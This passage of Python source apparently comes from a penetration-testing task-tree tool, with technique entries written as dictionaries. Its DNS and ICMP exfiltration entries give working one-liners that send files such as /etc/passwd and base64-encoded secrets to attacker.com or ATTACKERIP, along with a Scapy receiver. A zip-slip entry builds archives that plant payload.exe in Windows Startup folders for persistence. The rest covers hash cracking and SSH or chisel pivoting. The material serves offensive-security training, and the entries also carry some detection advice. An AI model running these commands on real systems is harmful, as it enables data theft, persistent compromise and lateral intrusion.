                            'type': 'manual',
                            'metadata': {
                                'description': 'Exfiltrate data via DNS queries',
                                'tags': ['OSCP:LOW', 'STEALTH', 'ADVANCED', 'EXFILTRATION'],
                                'alternatives': [
                                    'Manual: dig @ATTACKERDNS data.attacker.com',
                                    'Script: for d in $(cat data); do dig $d.attacker.com; done',
                                    'Tool: dnscat2 (full DNS tunnel)',
                                    'Tool: iodine (DNS tunnel)'
                                ],
                                'notes': '''
DNS exfiltration bypasses many firewalls (port 53 usually open)

Simple method:
On attacker, run DNS server or capture traffic
On target: dig $(base64 secret.txt).attacker.com

Tools:
- dnscat2: Full DNS tunnel
- iodine: DNS tunnel
- DNSExfiltrator: Python script

Detection: Easy to spot in DNS logs (unusual queries)
Use sparingly and with legitimate-looking domains
'''
                            }
                        },

                        {
                            'id': 'icmp-exfil',
                            'name': 'ICMP (Ping) Exfiltration',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exfiltrate data in ICMP packet payloads',
                                'tags': ['OSCP:LOW', 'STEALTH', 'ADVANCED', 'EXFILTRATION'],
                                'alternatives': [
                                    'xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line ATTACKERIP; done',
                                    'Python scapy script to send/receive ICMP data'
                                ],
                                'notes': '''
Exfiltrate via ICMP ping packets:
xxd -p -c 4 /etc/passwd | while read line; do
  ping -c 1 -p $line ATTACKERIP
done

Receiver (Scapy):
from scapy.all import *
def process(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 0:
        data = pkt[ICMP].load[-4:]
        print(data.decode(), end="")
sniff(iface="eth0", prn=process)

Advantages:
- ICMP often allowed through firewalls
- Low profile
- 4 bytes per packet

Disadvantages:
- Slow (max 4 bytes/packet)
- Easy to detect in IDS
- Packet loss issues
'''
                            }
                        }
                    ]
                }
            ]
        }

    def _create_specialized_techniques(self, target: str, port: int, service: str) -> Dict[str, Any]:
        """Create specialized attack techniques task tree"""

        return {
            'id': 'specialized-techniques',
            'name': 'Specialized Attack Techniques',
            'type': 'parent',
            'children': [
                # === ARCHIVE EXPLOITATION ===
                {
                    'id': 'archive-exploitation',
                    'name': 'Archive Exploitation (Zip-Slip)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'archive-path-traversal',
                            'name': 'Path Traversal in Archives',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create malicious archives with path traversal filenames',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT', 'MANUAL'],
                                'success_indicators': [
                                    'Archive created with traversal paths',
                                    'File extracts outside intended directory',
                                    'Payload placed in startup folder'
                                ],
                                'failure_indicators': [
                                    'Extraction sanitizes paths',
                                    'Security software blocks extraction',
                                    'Paths rejected by archiver'
                                ],
                                'next_steps': [
                                    'Test archive on target system',
                                    'Verify file placement location',
                                    'Trigger payload execution',
                                    'Maintain persistence'
                                ],
                                'alternatives': [
                                    'Create with RAR: rar a -ep evil.rar "../../path/payload.exe"',
                                    'Create with ZIP: zip -r evil.zip "../../../path/payload.exe"',
                                    'Create with TAR: tar -cvf evil.tar --transform "s,^,../../../," payload.exe',
                                    'Manual: Hex edit archive headers to inject traversal'
                                ],
                                'notes': '''
ZIP-SLIP VULNERABILITY (Path Traversal in Archives)

Concept:
Archive file contains entries with "../../../" in filename
When extracted, file writes outside intended directory
Can overwrite system files or place payloads in auto-run locations

Vulnerable Extractors:
- WinRAR â‰¤ 7.12 (CVE-2025-8088)
- 7-Zip (older versions)
- tar without sanitization
- Many programming libraries

Target Locations (Windows):
- Startup folder: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
- System32: C:\\Windows\\System32\\
- Public startup: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\

Creating Malicious Archive:
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*

Detection:
- List archive: 7z l evil.rar | grep "\\.\\."
- Check for absolute paths
- Inspect in hex editor

Mitigation:
- Update archiver to latest version
- Use "ignore paths" extraction option
- Extract in sandbox/VM
- Validate extracted file paths

Real-World Use:
RomCom (Storm-0978) used this in 2025 spear-phishing campaigns
'''
                            }
                        },

                        {
                            'id': 'archive-inspection',
                            'name': 'Inspect Archive Contents Safely',
                            'type': 'command',
                            'metadata': {
                                'command': '7z l suspicious.zip',
                                'description': 'List archive contents without extracting',
                                'flag_explanations': {
                                    'l': 'List contents only (no extraction)',
                                    'suspicious.zip': 'Archive file to inspect'
                                },
                                'tags': ['OSCP:MEDIUM', 'DEFENSIVE', 'QUICK_WIN'],
                                'success_indicators': [
                                    'File list displayed',
                                    'Paths visible for analysis',
                                    'Suspicious filenames identified'
                                ],
                                'alternatives': [
                                    'zipinfo suspicious.zip',
                                    'unzip -l suspicious.zip',
                                    'tar -tvf suspicious.tar',
                                    'rar l suspicious.rar',
                                    'python -m zipfile -l suspicious.zip'
                                ],
                                'notes': '''
Look for suspicious patterns:
- Filenames with "../"
- Absolute paths (C:\\, /etc/, etc)
- Hidden files (.bashrc, .ssh/authorized_keys)
- Executable files (.exe, .sh, .bat)
- Startup folder paths

Safe extraction:
7z x suspicious.zip -o./sandbox/
chmod -R 700 ./sandbox/
'''
                            }
                        }
                    ]
                },

                # === HASH CRACKING ===
                {
                    'id': 'hash-cracking',
                    'name': 'Hash Cracking',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'identify-hash',
                            'name': 'Identify Hash Type',
                            'type': 'command',
                            'metadata': {
                                'command': 'hashid "<hash_value>"',
                                'description': 'Identify hash algorithm type',
                                'flag_explanations': {
                                    '<hash_value>': 'Hash string to identify'
                                },
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'HASH_CRACKING'],
                                'alternatives': [
                                    'hash-identifier (interactive)',
                                    'hashcat --help | grep -i "mode"',
                                    'john --list=formats | grep -i hash',
                                    'Online: https://hashes.com/en/tools/hash_identifier'
                                ],
                                'notes': '''
Common hash formats:
- MD5: 32 hex chars (5f4dcc3b5aa765d61d8327deb882cf99)
- SHA1: 40 hex chars
- SHA256: 64 hex chars
- NTLM: 32 hex chars (same length as MD5, context matters)
- bcrypt: Starts with $2a$ or $2y$

After identification, use hashcat mode:
hashcat -m [MODE] hash.txt wordlist.txt
'''
                            }
                        },

                        {
                            'id': 'online-hash-lookup',
                            'name': 'Online Hash Lookup',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Check if hash exists in online databases',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RESEARCH'],
                                'alternatives': [
                                    'https://crackstation.net/',
                                    'https://md5decrypt.net/',
                                    'https://hashes.org/search.php',
                                    'https://hashkiller.co.uk/Cracker'
                                ],
                                'notes': '''
ALWAYS check online databases BEFORE attempting to crack locally.

Major databases:
- CrackStation: https://crackstation.net/ (MD5, SHA1, etc)
- MD5 Decrypt: https://md5decrypt.net/
- Hashes.org: https://hashes.org/search.php
- Hash Killer: https://hashkiller.co.uk/Cracker

Submit hash and wait for results.
Free and instant if hash is in database.
'''
                            }
                        }
                    ]
                },

                # === TUNNELING REFERENCE ===
                {
                    'id': 'pivoting-reference',
                    'name': 'Pivoting & Tunneling Reference',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Techniques for pivoting through compromised hosts',
                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'REFERENCE'],
                        'alternatives': [
                            'SSH tunneling: ssh -L localport:targetip:targetport user@pivot',
                            'SSH dynamic: ssh -D 9050 user@pivot (SOCKS proxy)',
                            'Chisel: ./chisel server -p 8000 --reverse',
                            'Metasploit: use post/multi/manage/autoroute',
                            'Proxychains: proxychains nmap -sT target'
                        ],
                        'notes': '''
Common pivoting scenarios:
1. Compromised host has access to internal network
2. Need to scan internal network from external position
3. Need to exploit services not directly accessible

Techniques:
- SSH Local Port Forward: -L localport:target:targetport
- SSH Remote Port Forward: -R remoteport:localhost:localport
- SSH Dynamic Port Forward: -D 9050 (SOCKS proxy)
- Chisel (HTTP tunnel): Supports SOCKS5
- Metasploit autoroute: Route through Meterpreter session
- SSHuttle: VPN over SSH

Refer to separate tunneling guide for detailed commands.
'''
                    }
                }
            ]
        }


# Additional helper methods for specialized services can be added here
